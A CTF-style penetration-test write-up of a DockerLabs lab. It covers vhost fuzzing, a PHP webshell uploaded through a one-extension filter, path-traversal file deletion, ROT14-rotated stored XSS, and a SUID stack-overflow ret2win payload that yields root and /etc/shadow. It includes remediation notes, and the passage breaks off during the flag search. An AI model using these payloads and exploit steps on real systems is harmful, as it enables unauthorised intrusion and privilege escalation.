# SEEKER — DockerLabs lab 65 (Medio)

*Fifteenth lab of the series. This is the first one whose catalogue description is true in full: "Laboratorio para practicar fuzzing de subdominios (virtual hosting) y escalada de privilegios en Linux." Both halves held, and the vhosting half is the **second direction** of a rule that lab 26 established in only one direction.*

**Result: root.** `uid=0(root)`, `/etc/shadow` read, reached in three hops from an unauthenticated HTTP request.
**Reward: none exists.** Eighth consecutive lab without one; §7 is the exhaustive search that establishes the absence.

---

## 1. Autocorrection (read this first)

Four things in this engagement were wrong in my own instrumentation, and each of them produced an answer that was well-formed, plausible, and wrong. Three of the four are the shape this repository already warns about, pointed at a new target.

### 1.1 I nearly reported seventeen hosts because every name answered `200`

The naive sweep is not subtle, which is why it is worth writing down as a failure I had to actively avoid rather than a trap I fell into.

Every single name returned `200`. A `-mc 200` filter — the default posture of `ffuf -fs`/`gobuster vhost`, both of which are in this repository's own tool list at `api_web.md:39` — reports **17 hosts**. The truth is **3**. The number is not a matter of degree: the sweep over-reports by a factor of nearly six, and **every name it invents is a name an assessor would put in the report.**

This is the same rule lab 26 taught from the other side. There, six names all answered and all six hashed identically, so the sweep over-reported *zero* real hosts hidden behind a catch-all. Here the sweep over-reports fourteen. A rule tested in one direction is not tested, and I only understood the shape once I had the other half in my hands.

The fix is not a better wordlist. It is the discriminator in §2.2, and the control that makes it trustworthy is a name I can prove does not exist.

### 1.2 `test -w` told me the SUID sudoers target was writable. It was not.

I ran the standard control for the sudoers filesystem-oracle — the one this repo records as *"`gcc` hace `execve` por nombre → control es el filesystem"* — and got:

```
$ test -w /usr/bin/busybox && echo BUSYBOX_WRITABLE
BUSYBOX_WRITABLE
```

That would have closed the escalation immediately: replace the sudo-allowed binary, get root on the next `sudo`. It is the documented oracle, it fired, and it was **false**.

The reason is `docker exec`, which defaults to `uid=0`. My control ran as the one identity on the box that can write any file, so it was measuring root's ability to overwrite root's binary. Re-run as the identity under test:

```
$ docker exec -u www-data seeker sh -c 'id; test -w /usr/bin/busybox && echo WRITABLE || echo NOT_WRITABLE'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
NOT_WRITABLE
```

`-rwxr-xr-x 1 root root 772880 /usr/bin/busybox` — root-owned, `0755`, and `/usr/bin` is not writable either. **The control held**, and the sudoers oracle does not apply here; the escalation had to go through `bs64` instead.

This is `decision-making.md` §8 — *measure the executing identity, never reason about the chain from the writing one* — but the failure mode is one I had not recorded: **a privilege-escalation control is the most likely test in the engagement to be run by a privileged tool, and it will therefore always succeed.** `docker exec`, `kubectl exec`, `sudo -u … test -w`, and a Burp Repeater running as root all produce the same fabricated escalation. The fix is not discipline about *which* command to run; it is that **every filesystem-control claim in a privilege-escalation finding must name the identity that was tested**, and a control whose result flips when you re-run it as the correct uid was never measuring the target.

### 1.3 My own vhost sweep reported sixteen false positives as "clean exits"

Locating the overflow offset, I swept the return-address position and recorded exit status:

```
offset= 63 RC=0     fire_banner=False
offset= 64 RC=139   fire_banner=False
offset= 65 RC=139   fire_banner=False
...
```

Offsets 56–63 "worked" and I initially read the transition at 63→64 as *the return-address slot is at 72*. It is not, and those eight clean exits were fabricated: at offsets below 64 the injected address lands **inside the 64-byte buffer**, so control flow is untouched and the program exits normally. A clean exit there means *my payload did nothing*, which is indistinguishable, in the output, from a successful redirection.

The detector had no discriminating power, because every wrong answer and the boring answer produced the same output — the `decision-making.md` shape, aimed squarely at my generator. Two things fixed it, and both are cheap:

* **Change the control's own content and require the answer to move.** Adding a distinctive side effect (printing a banner from the target function) turned eight identical `RC=0` values into one discriminating bit.
* **A crash is not a location either.** `RC=139` at 64 and above only proved *something* was overwritten, not what.

The real layout came from reading the frame, not from sweeping: `main` does `push rbp; mov rbp,rsp; sub rsp,0x40`, the buffer is at `rbp-0x40`, the saved `rbp` is at `rbp+0`, and `leave; ret` therefore consumes `[rbp+8]` — **offset 72**. Confirmed under `gdb` by dumping the live frame, not inferred.

### 1.4 The exploit worked under `gdb` and failed natively, and `gdb` was lying to me in a way I had not planned for

I chased this for a while and want to record the whole shape, because the two halves pointed in opposite directions and I initially believed neither.

`gdb` proved the control flow was correct — breakpoint at `fire` entry hit, `printf` executed, reached the `setuid` call site. Natively, the same payload gave `RC=139` and **no output at all**, not even the target function's own banner. Two independent causes, neither of them the target:

* **Stack alignment.** Returning into `fire` with `ret` rather than `call` leaves `rsp` off by 8 from the ABI. glibc's `printf` uses `movaps`, which faults on a misaligned stack. The fix is the standard `ret2ret` trampoline — put a bare `ret` at offset 72 and the real target at offset 80. The tell that this was the cause and not a wrong address: **the target function was entered and died inside its first library call.** Under `gdb` it did not die, because the debugger's own stack setup was already aligned.
* **`sudo`'s `Defaults use_pty` silently ate my NUL bytes.** The address `0x40136a` is `6a 13 40 00 00 00 00 00` — five NULs. A pipe is byte-transparent; **a PTY in canonical mode discards NUL bytes in the input line**, so the payload arrived corrupted. I proved the differential rather than asserting it: the same bytes through a FIFO reached the target intact, and the same bytes through the PTY never did.

This is the same class as the repo's *"a man-in-the-middle relay that does not preserve the client's source port silently breaks a stateful session protocol"* — a transport that changes the bytes, produces a plausible failure, and is not the target's fault. The generalisable rule is one I do not think is yet in the repository:

> **A byte-oriented exploit payload must not be delivered through a channel that is allowed to be a terminal.** Canonical-mode PTYs, `expect`, `ssh` without `-T`, telnet, and any line-editor wrapper all discard or transform NULs. Verify the channel by `od`-ing what the far end receives before believing that a payload failure is a payload error.

The general lesson across all four: **three of these were detectors pointed at the wrong thing, and each returned a clean, well-formed, confident answer.** A reader skimming my notes would have found a writable sudoers target, a located overflow offset, and a working `gdb` trace. None of the three existed.

---

## 2. Real surface

### 2.1 Host and container

```
$ nmap -sV -Pn -p- --open 172.17.0.8
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

One TCP port, no SSH. Debian 12 bookworm, kernel `7.0.0-34-generic`, container, `NoNewPrivs: 0`.

UDP coverage, declared rather than assumed: `/proc/net/udp` contains no sockets, `/proc/1/cmdline` is `service apache2 start`, and there is no `EXPOSE` directive to read. **`nmap -sU` was not run** — it needs root and is not available on this host — so I am reporting the corroboration I actually have (an empty `/proc/net/udp`, the container's only entrypoint, and a single-port full TCP scan agreeing) and declaring the gap. This target is TCP-only; the management-plane blindness in `decision-making.md:80` does not apply here, and I am not claiming to have closed it.

No SSH also means the "Linux privilege escalation" half of the description has no remote shell to escalate *from*: the foothold must be a web code-execution primitive. That is consistent with the description rather than a surprise.

### 2.2 HTTP surface — four declared vhosts, three real

`/etc/apache2/sites-enabled/000-default.conf`, in full, is the whole application surface:

| # | `ServerName` | `DocumentRoot` | Reachable? |
|---|---|---|---|
| 1 | `172.17.0.2` **and** `5eEk3r.dl` | `/var/www/5eEk3r` | **yes — and this is the default** |
| 2 | `5eEk3r.dl` | `/var/www/5eEk3r` | **no — dead configuration** |
| 3 | `crosswords.5eEk3r.dl` | `/var/www/crosswords/web` | **yes** |
| 4 | `admin.crosswords.5eEk3r.dl` | `/var/www/crosswords/admin` | **yes** |

**Vhost 2 is unreachable, and that is a finding about the config rather than about the host.** It declares the same `ServerName` and the same `DocumentRoot` as vhost 1. Apache uses the *first* matching vhost, and vhost 1 is first and is also the default for any unmatched `Host`, so vhost 2 can never be selected. It is dead weight that a reader will nonetheless parse twice.

**Vhost 1 carries two `ServerName` directives in one block**, which means the default vhost answers to the apex, to the IP literal, and to every name that is not vhost 3 or 4. This is the baseline, and §3.1 is the control that proves which hash it is.

### 2.3 The vhost table — the central evidence

Discriminator: **MD5 of the normalised response body**, with `Date`/`ETag`/`Last-Modified` excluded and whitespace runs collapsed. Two names that are *not* in any wordlist are included explicitly, and they are the control.

```
vhost (Host header)                 status  CLen    body-md5           ctype
---------------------------------------------------------------------------
5eEk3r.dl                           200     10705   f7cca221daa35bdc   text/html
crosswords.5eEk3r.dl                 200     934     ce35aa85b543f052   text/html; charset=UTF-8
admin.crosswords.5eEk3r.dl           200     2906    b6f0ca2c6979926d   text/html; charset=UTF-8
172.17.0.2                           200     10705   f7cca221daa35bdc   text/html
zzz-no-such-name-8f3a.5eEk3r.dl      200     10705   f7cca221daa35bdc   text/html      <-- CONTROL
definitely-not-real-4b21.invalid     200     10705   f7cca221daa35bdc   text/html      <-- CONTROL
admin.5eEk3r.dl                      200     10705   f7cca221daa35bdc   text/html
www.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
mail.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
dev.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
blog.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
shop.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
api.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
test.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
staging.5eEk3r.dl                    200     10705   f7cca221daa35bdc   text/html
old.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
intranet.5eEk3r.dl                    200     10705   f7cca221daa35bdc   text/html
seeker.5eEk3r.dl                     200     10705   f7cca221daa35bdc   text/html
```

**Three distinct hashes. Sixteen names on one of them.** The verdict, printed by the harness:

```
=== WILDCARD VERDICT ===
WILDCARD CONFIRMED: control name(s) share hash(es) ['f7cca221daa35bdc'] with real names
  baseline hash = f7cca221daa35bdc
```

The two control names are the load-bearing rows. **A name I can prove does not exist produces a hash I have already seen from a real name.** That is what makes `f7cca221daa35bdc` the baseline rather than a discovery, and it is the single control that converts this table from a list of responses into a measurement of the server.

The result that surprised me, and the one this lab is actually about:

> **`admin.5eEk3r.dl` is the baseline, not the admin host. The real admin host is `admin.crosswords.5eEk3r.dl` — two labels deeper.**

A wordlist of the obvious subdomain names — `admin`, `www`, `mail`, `dev`, `blog`, `shop`, `api`, `test`, `staging`, `old`, `intranet` — finds **zero** of the three real hosts. Every one of them is the catch-all. The two real application hosts are `crosswords` and a *nested* `admin.crosswords`, and the flat `admin` name is a decoy placed by the catch-all itself. This is the inverse of lab 26's decoy: there, `ldap.<domain>` existed only in the catalogue's promise; here, `admin.<domain>` exists in every wordlist and resolves to nothing at all.

### 2.4 The baseline is not a finding

`/var/www/5eEk3r` contains one file, `index.html` (10 705 bytes), and it is **the stock Apache 2.4.62 Debian default page**:

```
Apache2 Debian Default Page: It works
```

So the default vhost serves no project content, carries no version disclosure beyond the `Server` header, and holds nothing. Reporting "the default site is exposed" here would be reporting the baseline as a discovery — the exact inflation the brief warns about. **The default vhost here is the ruler, not the measured thing.** I list it in the table because the differential is the measurement; I do not file it as a finding.

### 2.5 Application source — the whole of it

Two PHP files, and they are short enough to quote completely.

`/var/www/crosswords/web/index.php` — a ROT-14 encoder that appends every submission to `converts.txt` and renders that file back **unescaped**:

```php
$encodedText = rot14($inputText);
file_put_contents('converts.txt', $encodedText . PHP_EOL, FILE_APPEND);
...
foreach ($previousConverts as $line) {
    // Aquí no estamos aplicando ninguna sanitización, por lo que hay vulnerabilidad XSS
    echo "<div class='previous-text'>" . $line . "</div>";
}
```

The file ends with:

```html
<! -- Al que contratamos para crear la web nos habló de algo llamado 'xss'... que será? -->
```

**This is the self-documenting pattern, and per `decision-making.md` §7 I discounted it rather than trusting it.** The comment names the sink precisely, and it is correct — but it is also **incomplete in the way that matters**, because the comment sits on the *loop that re-renders stored input* and says nothing about the two things that make the lab hard:

1. The value stored is `rot14($inputText)`, so **a payload must be pre-rotated to land as a live tag.** The naive `<script>` is stored as `<gqfw dh>` and is inert. This is the repo's *"un rot14 de tu payload es tu payload"* discipline in a form nobody would guess.
2. The file is the sink's **persistence**, which makes it stored XSS against every subsequent visitor, not reflected.

`/var/www/crosswords/admin/index.php` — an unauthenticated file manager with a one-string extension filter and an unvalidated delete path:

```php
if (isset($_FILES['upload'])) {
    $file_name = $_FILES['upload']['name'];
    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
    if ($file_ext === 'php') {                       // <-- the entire filter
        echo "<p>No se permiten archivos PHP, solo HTML.</p>";
    } else {
        $upload_file = $admin_dir . basename($file_name);
        move_uploaded_file($_FILES['upload']['tmp_name'], $upload_file);
    }
}
if (isset($_GET['delete'])) {
    $file_to_delete = $admin_dir . $_GET['delete'];   // <-- no basename()
    if (unlink($file_to_delete)) { ... }
}
```

There is **no `requireAuth`, no session check, and no token** anywhere in the file, and none anywhere in either vhost.

### 2.6 The escalation surface, read before attacking it

Per *read a management plane's configuration before attacking it*, the sudoers file and the filesystem it points at, before touching anything:

```
www-data  ALL=(astu:astu) NOPASSWD: /usr/bin/busybox
```

One delegation, to an account that is not root, naming an absolute path. **A sudoers rule that names a path is only as strong as that path's permissions**, which is the oracle this repository already records — and here it holds, per §1.2. So the chain continues from `astu`:

```
-r-sr-xr-x 1 root root 15776 /home/astu/secure/bs64
dr-xr-xr-x 2 root root  /home/astu/secure
drwx------ 4 astu astu  /home/astu
```

A setuid-root binary in a root-owned directory, reachable only because `astu` owns `/home/astu`. **Note what the first hop costs:** `www-data` cannot even *read* `bs64` — `/home/astu` is `drwx------`. The sudo hop is not a convenience here, it is the only reason the binary is analysable at all, and I had to become `astu` to copy it somewhere readable before I could disassemble it.

`bs64`, not stripped, `bs64.c`, gcc 14.2.1. Two functions decide everything:

```c
my_gets:  // writes into the caller's buffer; stops ONLY on 0x0a or 0xff
  401330: cmp  BYTE PTR [rbp-0x5],0xa
  401336: cmp  BYTE PTR [rbp-0x5],0xff
  ...     // no length check, no bound, no canary
  401364: mov  BYTE PTR [rax],0x0        // NUL-terminate at an arbitrary index

main:
  4013a2: sub   rsp,0x40                 // 64-byte buffer at rbp-0x40
  4013c1: call  401315 <my_gets>
  4013cd: call  401166 <to_base64>
  4013d7: leave
  4013d8: ret

fire:                                       // NEVER CALLED by main
  401382: mov  edi,0x0
  401387: call 401070 <setuid@plt>
  401396: call 401040 <system@plt>        // system("/bin/sh")
```

**`fire` is never called.** It is not dead code in the compiler's sense; it is a planted gadget, and `main`'s `ret` is the only thing that reaches it. There is no stack canary — `__stack_chk_fail` is absent from the import table, and `main`'s prologue has no `fs:0x28` read.

`strings` output makes the same function look like a gift:

```
Ejecutando /bin/sh
/bin/sh
```

An analyst who runs `bs64` and sees a root shell would conclude there is no vulnerability to find. **Running it is not the exploit** — `main` returns before `fire` is ever entered. The strings are a *label*, and per §7 a label that confirms your hypothesis is a stopping condition.

---

## 3. Findings

### 3.1 Unrestricted upload — extension denylist of one string, and the MIME map decides execution

**CWE-434** (root cause **CWE-20** / CWE-184 incomplete deny-list), **CWE-434 + CWE-434** chained to unauthenticated RCE.

The filter is `if ($file_ext === 'php')`. It is not a blocklist of dangerous extensions; it is a **string comparison against one of them**, and `strtolower` makes it case-insensitive but nothing more.

Evidence — the server's own file listing is the authority for what was stored:

```
$ curl -s -H 'Host: admin.crosswords.5eEk3r.dl' http://172.17.0.8/ | grep -oE '>[A-Za-z0-9._-]+\.[A-Za-z0-9]+</td>'
benign.html  converts.txt  index.php  shell.phar  shell.php5
shell.php7   shell.phps    shell.pht  shell.phtml  styles.css
```

Accepted, with the filter's own refusal quoted for the two it blocks:

```
benign.html    -> Archivo subido con éxito: benign.html
probe.php      -> No se permiten archivos PHP, solo HTML.
probe.PHP      -> No se permiten archivos PHP, solo HTML.
shell.phtml    -> Archivo subido con éxito: shell.phtml
shell.phar     -> Archivo subido con éxito: shell.phar
shell.php5     -> Archivo subido con éxito: shell.php5
shell.pht      -> Archivo subido con éxito: shell.pht
shell.php7     -> Archivo subido con éxito: shell.php7
shell.phps     -> Archivo subido con éxito: shell.phps
```

**`.php` is the only extension the filter rejects.** The negative control is the point: the filter *can* fire, so its silence on `.phtml` is a decision and not an absence of a check.

**And accepted is not executed.** Exactly **two of the seven** execute (`.phtml`, `.phar`), because the Apache MIME map — not the upload handler — decides, exactly as this repository's *"la extensión ejecutable la decide el MIME map"* oracle requires:

```
GET /shell.phtml -> RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
GET /shell.phar  -> RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
GET /shell.php5  -> <?php echo "RCE-OK:" . shell_exec("id"); ?>     (served as source)
GET /shell.pht   -> <?php ... ?>                                      (served as source)
GET /shell.php7  -> <?php ... ?>                                      (served as source)
GET /shell.phps  -> 403 Forbidden                                    (source handler refuses)
GET /benign.html -> <b>benign-probe-9c1d</b>                          (control: must NOT execute)
```

**Impact.** Unauthenticated remote code execution as `www-data`. The upload requires no credential, and the trigger is a plain `GET` to a path the attacker chose.

**Root cause, stated as the decision and not the mechanism** (`decision-making.md` §4). The mechanism is the string comparison. The decision is *validate the client's declared extension by denylisting one value, and write user-controlled bytes into another vhost's document root, which the server is configured to execute.* Fixing the comparison fixes this upload endpoint and leaves every future writer of that directory exposed. Two decisions, therefore two fixes:

1. **Allowlist, on the stored name and on the bytes.** Reject anything not on a short list of inert types; move storage outside the document root; serve uploads from a location with the PHP handler disabled.
2. **Remove execution from the upload directory**, so the MIME map is no longer part of the trust path.

**This lab makes the pairing unusually explicit**: the upload handler writes into `/var/www/crosswords/web/`, which is a *different vhost's* document root from the one the uploader authenticated to. The admin vhost plants; the public vhost executes. Per the repo's *"the trigger route may be public even when the upload route is not"* — here **both** are public, and the write and the trigger are on different hosts.

### 3.2 No authentication on the admin panel — CWE-306

```
$ curl -s -o /dev/null -w '%{http_code}\n' -H 'Host: admin.crosswords.5eEk3r.dl' http://172.17.0.8/
200
```

No cookie, no token, no session, no `Authorization` header. There is no authentication code in either PHP file to disable — this is not a bypass, it is a design.

Per `decision-making.md` §5 this is reported as an **independent finding with its own impact and fix**, not as a footnote in the exploit narrative. The upload, the delete, and the directory listing are three capabilities behind one missing decision, and they must be reported as one finding with three impacts, because the fix (an authentication gate on this vhost) closes all three and nothing else does.

The interesting half is **discoverability, not access**: this panel is not merely unauthenticated, it is *invisible without the vhost sweep*, because the obvious name `admin.5eEk3r.dl` is the catch-all. The panel is protected by obscurity that the lab's own config defeats, and it is the second-nested label that exposes it.

**Remediation.** Authenticate the admin vhost; authorise per operation; do not rely on the hostname for either.

### 3.3 Path traversal in the delete handler — CWE-73 / CWE-22

```php
$file_to_delete = $admin_dir . $_GET['delete'];   // basename() applied on upload, not here
```

`basename()` is applied to the upload name and **omitted** from the delete path. Same file, same author, adjacent operations, opposite handling.

Evidence, with the durable state as the oracle rather than the response:

```
canary:  -rw-r--r-- 1 www-data www-data 0 /tmp/canary_9c1d

# control — a real basename in the same directory, proving the endpoint CAN delete
?delete=benign.html                        -> Archivo eliminado con éxito

# the traversal
?delete=../../../../../../tmp/canary_9c1d   -> Archivo eliminado con éxito

# did the traversed target actually disappear?
ls -l /tmp/canary_9c1d
ls: cannot access '/tmp/canary_9c1d': No such file or directory
```

**I do not trust the `éxito` string.** The response is the endpoint's claim; the missing file is the server's state. Both were read, and the control proves the endpoint is not simply reporting success unconditionally.

**Impact.** Arbitrary file deletion as `www-data`, unauthenticated. Bounded by that identity: it cannot delete root-owned files, so it is a denial-of-service against anything the web user can write, and it cannot reach `/etc/shadow`. Its real weight is *composed* with §3.1 — delete `index.php` and the site is down; and because the delete traverses, an attacker can remove files outside the web root entirely.

**Remediation.** `basename()` the delete parameter as the upload already does, or better, resolve against an allowlist of known filenames. Never concatenate a request parameter into a path used by a destructive syscall.

### 3.4 Stored XSS, gated behind a Caesar shift — CWE-79

The sink is unescaped and the source is a persistent file, so this is stored XSS:

```
$ cat /var/www/crosswords/web/converts.txt
dfcps1
dfcps2
dfcps3
<script>document.title="XSSPROOF-"+document.cookie</script>
```

And the page renders it raw:

```
$ curl -s -H 'Host: crosswords.5eEk3r.dl' http://172.17.0.8/ | grep -c 'XSSPROOF'
1
$ curl -s -H 'Host: crosswords.5eEk3r.dl' http://172.17.0.8/ | grep -oE "previous-text'>[^<]*(<script>|</script>)[^<]*"
previous-text'><script>document.title="XSSPROOF-"+document.cookie
```

**The oracle is the rotated payload, and the report must say so.** I submitted `<eodubf>paogyqzf.fufxq=...</eodubf>`, which `rot14` transforms into the live tag above. The textbook `<script>alert(1)</script>` is stored as `<gqfw dh>` and is inert — a payload that works and looks broken in the same field. I verified the rotation in both directions before sending it, so the evidence is a value I constructed, not one the app produced on its own.

**Impact.** Script execution in the `crosswords` origin for every subsequent visitor. Rated by what the sink hands the attacker: there is **no session to steal** — this lab has no authentication anywhere, so there is no cookie to exfiltrate and no privilege to borrow. The honest impact is *stored script execution in a shared origin*, plus a durable defacement primitive. I am not upgrading it to account takeover, because there is no account.

**Remediation.** `htmlspecialchars()` on output, which the same file already uses correctly in its `<p><?php echo $encodedText; ?></p>` block — the author knows the function and applied it in one place and not the other, which is the signature of a missed sink rather than a missing concept.

### 3.5 SUID-root binary with an unbounded read and a planted shell gadget — CWE-121 / CWE-190 / CWE-269

`my_gets` writes into a 64-byte stack buffer with no bound, terminating only on `0x0a`/`0xff`, and the binary is compiled without a stack protector. `fire()` — `setuid(0); system("/bin/sh")` — is never called by `main`, so it is reachable only by overwriting `main`'s return address.

**Container preconditions, checked before blaming anything** (`decision-making.md` §8 — localise it before blaming the container):

```
NoNewPrivs: 0
CapEff:      0000000000000000
/ : rw,relatime - overlay overlay rw,…      <-- no nosuid on the root filesystem
```

`/home` is **not** a separate mount, so no `nosuid` applies to `bs64`. Had either precondition been different I would have reported a latent bug with an honest "no setuid path in this deployment" note, which is a different finding.

**Proof of exploitation, literal:**

```
$ (cat /tmp/y.bin; printf 'id\nid -u\nwhoami\nuname -a\ncat /etc/shadow | head -2\n'; sleep 20) \
    | sudo -n -u astu /usr/bin/busybox sh -c "/home/astu/secure/bs64 < /tmp/fifo"
uid=0(root) gid=1000(astu) groups=1000(astu),100(users)
0
root
Linux dockerlabs 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
root:*:20080:0:9997:7:::
daemon:*:20080:0:9997:7:::
====ROOT-SHELL====
RC=139
```

`RC=139` is **not a failed exploit** and this is worth stating because it looks like one. It is the `SIGSEGV` from `fire`'s own `pop rbp; ret` into stack garbage *after* `system("/bin/sh")` has already returned. The root shell ran, executed six commands, and exited; then the corrupted frame took the process down. Reading the exit status as the verdict would have made me re-run a working exploit eight more times.

**Payload** (89 bytes; offset 72 is `main`'s consumed return slot, offset 80 is the alignment trampoline — see §1.4):

```
'A'*64  'B'*8  p64(0x40139d)  p64(0x40136a)  '\n'
                    ^ret trampoline  ^fire: setuid(0); system("/bin/sh")
```

**Root cause.** A setuid-root binary that reads unbounded input into a fixed stack buffer, compiled with no stack protector, containing a function that unconditionally escalates. Three defects, one gadget. **Remediation:** remove setuid (the program does not need root for anything it does), add `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2`, bound the read, and delete `fire`.

### 3.6 No web logging at all — CWE-778

```
$ ls -l /var/log/apache2/
lrwxrwxrwx 1 root root  9 access.log -> /dev/null
lrwxrwxrwx 1 root root  9 error.log  -> /dev/null
-rw-r----- 1 root adm 1357 other_vhosts_access.log
```

Every `ErrorLog` and `CustomLog` in the vhost configuration points at `${APACHE_LOG_DIR}/error.log` and `…/access.log`, **and both of those are symlinks to `/dev/null`.** All four vhosts write to a black hole. The one file with content is Debian's stock `other_vhosts_access.log`, holding eight build-time lines, every one against the catch-all:

```
172.17.0.2:80 … "GET /" 301 553
172.17.0.2:80 … "GET /index.php HTTP/1.1" 404 489
172.17.0.2:80 … "GET /index.html HTTP/1.1" 404 489
```

**This has a direct consequence for the methodology, and it is the more useful half.** Every request in this engagement — the vhost sweep, the upload, the RCE, the privilege escalation — left **no trace in any log on the target**. Log-based corroboration was not merely unavailable, it was actively destroyed. Every finding in this writeup rests on live response bodies and on `id` output, which is the correct evidence class anyway, but an analyst who planned to retro-validate the attack from logs would have concluded **no attack happened**, because none was recorded.

**Remediation.** Point the logs at real files, ship them off-host, and alert on the unauthenticated admin vhost.

### 3.7 Findings present but not used

* **Dead vhost configuration.** Vhost 2 is unreachable (§2.2). Reported as a configuration defect, not exploited — and worth noting that an admin who "fixed" vhost 1's `ServerName` would silently promote a duplicate.
* **The ROT-14 encoder as a cipher.** It is a fixed, keyless Caesar shift; `converts.txt` is a plaintext log of every user's submission. Not used: no data in it to decrypt and the XSS is the same file.
* **`.pht` / `.php5` / `.php7` accepted but inert.** Stored in the document root as source-readable PHP. Not used, and correctly so: the same finding as §3.1, a worse payload, no additional capability. Listed because their presence means **PHP source is publicly readable at a known path**, which is a disclosure in its own right even though it discloses nothing secret today.
* **`converts.txt` is world-readable at `/converts.txt`.** Unauthenticated, append-only, and it reflects every visitor's input. Low severity today; it becomes a finding the moment anyone pastes a secret into the encoder.

### 3.8 Controls that held

Each with the control that proves it could have failed.

* **The sudoers path control held.** `www-data` cannot write `/usr/bin/busybox` nor `/usr/bin`. *Positive control:* the same `test -w` **as root** returns writable (§1.2) — the control demonstrably fires, and it fires *against* the finding, which is what makes it trustworthy.
* **The upload extension filter fires.** `.php` and `.PHP` are both refused, verified twice. The filter is real; it is one value wide.
* **The sudoers rule is scoped, not `ALL`.** *Positive control:* `sudo -n -u astu /usr/bin/id` and `sudo -n -u astu /bin/sh` both return `sudo: a password is required`, `exit=1`. The allowlist cannot be walked around by naming a different binary.
* **`www-data` cannot read `bs64`.** `/home/astu` is `drwx------`; `cat` and `gdb` both return `Permission denied`. I had to take the sudo hop before the binary was analysable at all.
* **No anonymous `root` path exists in the pool.** `id` inside the RCE returned `uid=33(www-data)` every time, across four separate primitives. The chain has exactly the three hops the source predicts, and no boundary was crossed that I did not measure.
* **PHP is not enabled in the admin vhost's own root** — the uploaded `.phtml` executes only under `crosswords`, not under `admin`. Untested as a control; noted so a reader does not assume the two roots behave alike.

---

## 4. Control tests, with positive controls

| # | Claim | Control | Positive control (proves it can fail) | Result |
|---|---|---|---|---|
| 1 | `f7cca221daa35bdc` is the baseline | Two names that cannot exist | `admin.crosswords.5eEk3r.dl` yields a *different* hash | **Confirmed** |
| 2 | 3 real hosts | Hash clustering over 17 names | 2 of 3 hashes each held by exactly 1 name | **Confirmed** |
| 3 | Body hash is a valid discriminator | 3 reads, no writes | Crosswords hash moved on 3 consecutive reads (§5.1) | **Conditional — see §5.1** |
| 4 | `.php` filter is live | Upload `.php` | `.phtml` accepted in the same request | **Confirmed** |
| 5 | `.phtml` executes | `GET` it | `.html` and `.php5` served as source | **Confirmed** |
| 6 | RCE identity | `id` first | — | `uid=33(www-data)` |
| 7 | sudoers target not writable | `test -w` **as www-data** | Same test as root says writable | **Confirmed, control held** |
| 8 | sudo allowlist is narrow | `sudo -u astu /usr/bin/id` | `/usr/bin/busybox` succeeds | **Confirmed** |
| 9 | setuid path is live | `NoNewPrivs`, mount opts | `/` has no `nosuid` | **Confirmed** |
| 10 | Overflow offset is 72 | Read the frame; `gdb` dump | 72 A's `SIGSEGV`s, 71 does not | **Confirmed** |
| 11 | Traversal deletes a real file | Read durable state | `benign.html` deleted by basename | **Confirmed** |
| 12 | `converts.txt` reflects stored input | `cat` as www-data | — | Live `<script>` present |
| 13 | No reward exists | §7 | — | **Absence established** |

---

## 5. Chain, with order and justification

### 5.1 The path taken

1. **TCP full scan.** One port, `80/tcp`, Apache 2.4.62. No SSH — so the foothold has to be web, and "Linux privilege escalation" has to start from a code-execution primitive rather than a login. (`nmap -p-` is TCP; UDP coverage is declared in §2.1 and is a stated gap, not a closed port.)
2. **Read the vhost config before attacking anything.** Four vhosts; three reachable. This is where the lab's whole shape became visible, and it cost one `cat`.
3. **Vhost sweep with a body-hash discriminator, including two provably-absent controls.** 17 names → 3 hashes. This is the finding: `admin.5eEk3r.dl` is baseline, the real admin is `admin.crosswords.5eEk3r.dl`.
4. **Found the panel with no credential.** `200`, no session anywhere in the codebase.
5. **Read the upload handler and the delete handler before probing them.** Predicted the one-string filter and the missing `basename()`; then confirmed both.
6. **Self-tested the filter** — `.php` refused, `.phtml` accepted — so the acceptance meant something.
7. **Established the MIME map empirically**, extension by extension, with `.html` as the negative control.
8. **`id` first**: `uid=33(www-data)`. Three hops predicted, three measured.
9. **Read sudoers and the target's permissions as `www-data`, not as root.** Control held; the documented shortcut does not apply.
10. **`sudo -u astu` → `uid=1000(astu)`.** Became the only identity that can read `bs64`.
11. **Read `bs64`'s source before exploiting it.** Found the overflow, the missing canary, and `fire` — and found that `main` never calls `fire`.
12. **Located the frame by reading the prologue, confirmed under `gdb`.** Built `ret2ret` for alignment. **Delivered the payload through a FIFO** because sudo's PTY eats NULs.
13. **`id` at the end**: `uid=0(root)`, `/etc/shadow` read.

### 5.2 What each step bought

| Step | Bought | Cost if skipped |
|---|---|---|
| vhost config read | The entire application map, pre-attack | Hours of black-box guessing; the nested `admin.crosswords` is not guessable |
| Body-hash sweep | 3 hosts, correctly | 17 "hosts", 14 of them invented |
| Source read | Predicted filter + traversal before probing | A filter read as validation rather than as one string |
| `id` on each primitive | Correct hop count, correct severities | Reporting a 1-hop chain that is 3 |
| `test -w` as `www-data` | Kept a *false* escalation out of the report | A fabricated critical finding |
| `bs64` source read | The overflow, not the strings | Chasing a "root shell" the binary never gives |

### 5.3 Reward

**There is none.** This is the eighth consecutive lab in the series with no `FLAG{}`, and I am reporting the absence rather than manufacturing a value.

Exhaustive search, as root after §3.5:

```
# no flag-like file anywhere on the filesystem
find / -xdev \( -iname '*flag*' -o -iname '*secret*' -o -iname '*reward*' \
                -o -iname '*.flag' -o -iname 'token*' -o -iname '*key*' \) 2>/dev/null
  → /etc/apt/keyrings
  → /etc/php/8.2/mods-available/tokenizer.ini
  → /var/lib/php/modules/8.2/{cli,registry,apache2}/enabled_by_maint/tokenizer
  (no reward artefact; all hits are distro files)

# no flag string in any readable text
grep -rIl -E 'FLAG\{|flag\{|[Ff]lag:' /  → only perl/CPAN docs, gdb python,
